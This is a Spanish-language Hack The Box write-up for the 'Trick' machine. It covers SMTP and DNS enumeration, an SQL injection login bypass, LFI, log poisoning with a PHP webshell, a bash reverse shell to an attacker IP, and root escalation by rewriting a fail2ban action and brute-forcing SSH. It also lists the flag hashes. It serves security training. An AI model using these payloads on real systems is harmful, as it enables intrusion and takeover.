---
tags:
  - type/writeup
  - estado/completo
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/477
dificultad: Media
ip: 10.10.11.166
os: Linux
relacionados:
  - "[[Notas/Procesar/nslookup|nslookup]]"
  - "[[Notas/Procesar/dig|dig]]"
  - "[[File Inclusion]]"
  - "[[Log Poisoning]]"
  - "[[SQL Injection (SQLi)|SQLI]]"
  - "[[Cron]]"
  - "[[vhosts]]"
  - "[[fail2ban]]"
---
#  HackTheBox - Trick

## Reconocimiento

### Escaneo de Puertos con Nmap

El escaneo inicial con `nmap` revela cuatro puertos abiertos: SSH (22), SMTP (25), Domain (53) y HTTP (80).
```Bash
nmap -p- --min-rate 10000 10.10.11.166
```

**Resultado del escaneo rápido:**
```
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http
```

Un escaneo más detallado para identificar servicios y versiones nos da más información:
```Bash
nmap -p 22,25,53,80 -sCV 10.10.11.166
```

**Resultado del escaneo de servicios:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> [!info] **Puntos Clave del Reconocimiento**
> 
> - **SO:** Debian 10.
> - **Servidor Web:** nginx 1.14.2.
> - **Servidor SMTP:** Postfix, soporta el comando `VRFY`.
> - **Servidor DNS:** BIND, podría permitir transferencias de zona.

### Enumeración SMTP (Puerto 25)

El comando `VRFY` en SMTP permite confirmar la existencia de usuarios en el sistema. Se puede hacerlo manualmente con `telnet` o automatizarlo con herramientas como `smtp-user-enum`.

**Prueba manual con `telnet`**:
```Bash
telnet 10.10.11.166 25
```

```
Trying 10.10.11.166...
Connected to 10.10.11.166.
Escape character is '^]'.
220 debian.localdomain ESMTP Postfix (Debian/GNU)
VRFY root
252 2.0.0 root
VRFY usuario_inexistente
550 5.1.1 <usuario_inexistente>: Recipient address rejected: User unknown in local recipient table
```

**Automatización con `smtp-user-enum`**:
```Bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt -t 10.10.11.166 -p 25
```
La herramienta no responde. 

**Pruebo con nmap**:
```bash
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.users='root' 10.10.11.166
```
Tampoco logro respuesta, no me logra decir si el usuario existe o no, solo la forma manual funciona.

### Enumeración DNS (Puerto 53)

Primero, descubro el nombre de dominio principal a través de una búsqueda inversa (reverse lookup).
```Bash
dig @10.10.11.166 -x 10.10.11.166
```

**Resultado:**
```
166.11.10.10.in-addr.arpa. 604800 IN    PTR     trick.htb.
```
> [!info] El dominio es `trick.htb`. Lo añado al `/etc/hosts`.

El puerto TCP 53 abierto sugiere una posible **transferencia de zona (AXFR)**.
```Bash
dig @10.10.11.166 axfr trick.htb
```

**Resultado de la Transferencia de Zona:**
```
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
```

> [!success] Subdominios Descubiertos
> 
> trick.htb y preprod-payroll.trick.htb

### Enumeración Web (trick)

Uso `GoBuster` en `trick.htb` pero no encuentra nada relevante.
```bash
gobuster dir -u "http://$(cat ip)" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t200 -x php,js,txt | tee logs/dirs   
```

```
/assets               (Status: 301) [Size: 185] [--> http://10.10.11.166/assets/]
/css                  (Status: 301) [Size: 185] [--> http://10.10.11.166/css/]
/js                   (Status: 301) [Size: 185] [--> http://10.10.11.166/js/]
```

### Enumeración Web (preprod-payroll)

Al visitar http://preprod-payroll.trick.htb, encuentro un portal de login.

La enumeración de directorios con `gobuster` revela un archivo `users.php` con un nombre de usuario.
```Bash
gobuster dir -u http://preprod-payroll.trick.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

### Enumeración de Subdominios

**Uso wfuzz**:
```bash
wfuzz -c -u "http://preprod-payroll.trick.htb" -H 'Host: preprod-FUZZ.trick.htb' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 --hc=404 --hw=475 | tee logs/fuzz
```
```
000000564:   200        178 L    631 W      9660 Ch     "marketing"
```

> [!success] Subdominio Descubierto
> 
> preprod-marketing.trick.htb
 
 Lo añado junto a los otros al `/etc/hosts`:
 ```bash
 10.10.11.166    trick.htb preprod-payroll.trick.htb preprod-marketing.trick.htb
```
 
### *Resumen de la Enumeración*

- **`http://trick.htb`**: Muestra una página estática de "Coming Soon". Un escaneo con `gobuster` no revela nada de interés.
- **`http://preprod-payroll.trick.htb`**: Me redirige a un portal de login llamado "Employee’s Payroll Management System".
- **`http://preprod-marketing.trick.htb`**: Me lleva a una web sencilla donde la url llama la atención luego de seleccionar algún hipervinculo del menu.

---

## Explotación de Vulnerabilidades 

### Inyección SQL (SQLi)

El portal de login en `preprod-payroll.trick.htb` es vulnerable a una inyección SQL de bypass de autenticación.

**Payload de Bypass:**
- **Usuario:** `' or 1=1;-- -`
- **Contraseña:** (cualquier cosa)

Esto me concede acceso al panel de administración.

> [!WARNING] Rabbit Hole
> 
> El subdominio preprod-payroll.trick.htb es una distracción (rabbit hole). Aunque se puede obtener acceso a un panel de administración mediante una inyección SQL simple, no conduce a la escalada de privilegios.

### Explotación de LFI

El sitio `http://preprod-marketing.trick.htb` tiene una interfaz simple. Al navegar, se observa que las URLs utilizan un parámetro `page`.

`http://preprod-marketing.trick.htb/index.php?page=contact`

> [!ATTENTION] Vulnerabilidad LFI
> 
> La presencia del parámetro page es un fuerte indicador de una posible vulnerabilidad de Inclusión de Ficheros Locales (LFI).

Probando encuentro que el LFI aparece al duplicar los puntos y barras:
```HTTP
http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd
```

El archivo `/etc/passwd` revela un usuario no estándar: `michael`.

### Shell vía Log Poisoning

Encuentro un log vulnerable en `/var/log/nginx/access.log`.

1. **Leo el Log de Acceso**:
Puedo confirmar que tenemos acceso al archivo de log usando nuestro LFI.
```http
http://preprod-marketing.trick.htb/index.php?page=....//....//....//var/log/nginx/access.log
```

2. **Inyecto el Payload en el User-Agent**:
Los logs de acceso registran el User-Agent de cada petición. Puedo interceptar una petición con Burp Suite y modificar el User-Agent para que contenga la webshell PHP.
```bash
curl -sG 'http://preprod-marketing.trick.htb/index.php' -A "<?php system(\$_GET['cmd']); ?>"
```

3. **Ejecuto Comandos**:
Al visitar nuevamente la URL del LFI para incluir el log, el código PHP que inyecté será ejecutado por el servidor. Ahora puedo pasarle comandos.
```http
http://preprod-marketing.trick.htb/index.php?page=....//....//....//var/log/nginx/access.log&cmd=id
```

4. **Pido una reverse shell desde el navegador**:
```http
[Title Unavailable \| Site Unreachable](http://preprod-marketing.trick.htb/index.php?page=....//....//....///var/log/nginx/access.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.9/443%200%3E%261%27)
```

Logro acceso a la maquina como usuario `michael`.

---

## Escalada de Privilegios

### Enumeración Interna

Ejecuto`sudo -l`:
```Bash
sudo -l

Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

> [!info] Vector de Escalada Clave
> 
> El usuario michael puede reiniciar el servicio fail2ban como root y sin necesidad de contraseña. Este es mi principal punto de interés.

Busco archivos o directorios donde `michael` tenga permisos especiales. El usuario pertenece al grupo `security`.
```Bash
find / -group "security" 2>/dev/null
```

Este comando revela que el grupo `security` tiene permisos de escritura (`rwx`) sobre el directorio `/etc/fail2ban/action.d`.

> [!success] Permisos de Escritura
> 
> El grupo security tiene permisos de lectura, escritura y ejecución (rwx) sobre el directorio /etc/fail2ban/action.d/. Como michael pertenece a este grupo, puedo crear y modificar archivos en esta ubicación.

### Análisis del Vector de Ataque: Fail2Ban

- **Permisos:** Puedo crear y modificar archivos en `/etc/fail2ban/action.d`.
- **Sudo:** Puedo reiniciar el servicio `fail2ban` como `root`.

El servicio Fail2Ban ejecuta acciones (definidas en los archivos de `action.d`) cuando un intento de login falla repetidamente. La acción por defecto, `iptables-multiport.conf`, define un comando `actionban`. Puedo modificar este comando para ejecutar una reverse shell.

### Detección del Cron Job

Al intentar modificar o crear archivos en `/etc/fail2ban/action.d`, noto que los cambios se revierten cada pocos minutos. Para investigar esto, uso `pspy64`.

```Bash
# En la máquina atacante
wget [https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64](https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64)

# En la máquina víctima
wget http://<KALI_IP>:8000/pspy64
chmod +x pspy64
./pspy64
```

`pspy` revela que un script (`/root/f2b.sh`) ejecutado por `root` cada 3 minutos restaura el directorio `/etc/fail2ban` desde un backup en `/root/fail2ban`.

> [!IMPORTANT] Ventana de Ataque
> 
> Tengo una ventana de 3 minutos para realizar el ataque entre cada ejecución del cron job.

### Ejecución del Ataque

1. **Modificar la acción de baneo**:
    Edito el archivo /etc/fail2ban/action.d/iptables-multiport.conf. Reemplazo la línea actionban con un payload que copie el binario de bash a /tmp y le asigne el bit SUID.
    
**Payload Malicioso**:
```
# actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
actionban = chmod u+s /bin/bash
```
    
2. **Reiniciar fail2ban**:
    Aplico los cambios reiniciando el servicio con sudo.
    ```
    sudo /etc/init.d/fail2ban restart
    ```
    **Resultado:**
    ```
    [ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
    ```
    
3. **Activar el Baneo**:
    Desde mi máquina atacante, realizo 5 o más intentos de login fallidos vía SSH contra la máquina víctima para cualquier usuario. crackmapexec es perfecto para esto.
    ```Bash
    crackmapexec ssh 10.10.11.166 -u fakeuser -p /usr/share/wordlists/rockyou.txt
    ```
    Noto que no bloquea la conexión, ya que mi acción modificada no crea una regla de `iptables`, sino que crea el binario SUID.
    
4. **Escalar a Root**:
	```bash
	bash -p
```
    
    **Shell como root:**
    ```Bash
    root-bash-5.0# id
    uid=1001(michael) gid=1001(michael) euid=0(root) groups=1001(michael),1002(security)
    root-bash-5.0# cat /root/root.txt
    ```
    
> [!success] ¡Escalada de Privilegios Completada!


___

## Bandera(s)

> [!FLAG] `flag{user}`
> 16c016013b2c1a1db8e334bcd744355e
^bandera

> [!FLAG] `flag{root}`
> 1a0d453fa21e35844b781b305c291ba3
^bandera